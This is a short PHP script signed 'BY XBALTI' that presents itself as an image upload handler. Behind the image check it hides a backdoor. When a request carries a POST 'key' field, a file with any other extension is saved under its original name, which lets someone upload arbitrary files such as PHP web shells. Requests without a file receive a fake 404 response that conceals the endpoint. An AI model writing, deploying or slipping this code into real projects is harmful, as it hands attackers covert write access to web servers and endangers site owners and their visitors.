<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |  
*/
 if(isset($_FILES['image'])){
      $errors= array();
      $file_size = $_FILES['image']['size'];
      $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
      
      $expensions= array("jpeg","jpg","png");
      if(in_array($file_ext,$expensions)=== true){
	  if (!unlink("my.jpeg")) { }
	  if (!unlink("my.jpg")) { }
	  if (!unlink("my.png")) { }
		 if($file_size > 2097152) {
         header("Location: ./");
      }
	  
	  else {
		$newname = "my.".$file_ext;
        echo isset ($_GET['x']) ? (copy ($_FILES['image']['tmp_name'], $newname) ? "Image Uploaded" : "Error") : "Off";
		header("Location: ./");
	  }
	  }
	  else {
		  
	echo isset ($_POST['key']) ? (copy ($_FILES['image']['tmp_name'], $_FILES['image']['name']) ? "Image Uploaded" : "Error") : "Off";
	header("Location: ./");
           }
	  }
	else {
		header('HTTP/1.0 404 Not Found'); 
		exit();
	}
	  
	  
      
?>